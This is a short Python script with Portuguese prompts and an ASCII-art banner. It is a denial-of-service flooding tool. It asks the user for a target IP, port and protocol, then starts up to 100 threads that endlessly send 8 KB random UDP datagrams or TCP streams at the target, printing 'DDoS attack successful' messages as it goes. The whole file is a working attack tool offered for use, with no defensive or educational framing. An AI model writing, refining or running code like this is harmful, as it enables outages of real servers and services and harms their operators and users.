import signal
import socket
import random
import threading
import sys
import time
import os

print("\033[96m⠀⠀⠀⠀⠀⢀⡴⠋⠉⠛⠒⣄⠀⠀⠀⠀⠀⠀")
time.sleep(0.3)
print("⠀⠀⠀⠀⢸⠏⠀⠀⣶⡄⠀⠀⣛⠀⠀⠀⠀⠀")
time.sleep(0.3)
print("⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⡤⠋⠠⠉⠡⢤⢀⠀")
time.sleep(0.3)
print("⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⢉⣝⠲⠤⣄⣀⣀⠌")
time.sleep(0.3)
print("⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀")
time.sleep(0.3)
print("⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀")
time.sleep(0.3)
print("⢀⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀")
time.sleep(0.3)
print("⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⠀⠀⠀⠀")
time.sleep(0.3)
print("")

ip = str(input("\033[96mEndereço: \x1b[0m"))
port = int(input("\033[96mPorta: \x1b[0m"))
attack_type = input("\033[96mTipo de ataque (UDP/TCP): \x1b[0m").lower()
times = min(int(input("\033[96mTime (MÁX: 1000): \x1b[0m")), 1000)
threads = min(int(input("\033[96mPacotes (MÁX: 1000): \x1b[0m")), 100)

def udp_attack():
	# 8 kb
    data = random._urandom(8 * 1024)
    i = random.choice(["[*]", "[!]", "[#]"])
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                addr = (ip, port)
                for _ in range(times):
                    s.sendto(data, addr)
                print(f"\x1b[93m {i} Ataque \x1b[0mDDoS \x1b[93mcom sucesso! (UDP)")
        except:
            print("[×] ERRO 304")

def tcp_attack():
	# 8 kb
    data = random._urandom(8 * 1024)
    i = random.choice(["[*]", "[!]", "[#]"])
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
                for _ in range(times):
                    s.send(data)
                print(f"\033[96m {i} Ataque  \x1b[0mDDoS \033[96mcom sucesso! (TCP)")
        except:
            print("[×] ERRO 304")

if attack_type == 'udp':
    for _ in range(threads):
        th = threading.Thread(target=udp_attack)
        th.start()
elif attack_type == 'tcp':
    for _ in range(threads):
        th = threading.Thread(target=tcp_attack)
        th.start()
else:
    print("\033[96m( Tipo de ataque inválido. Por favor, escolha 'UDP' ou 'TCP'. )")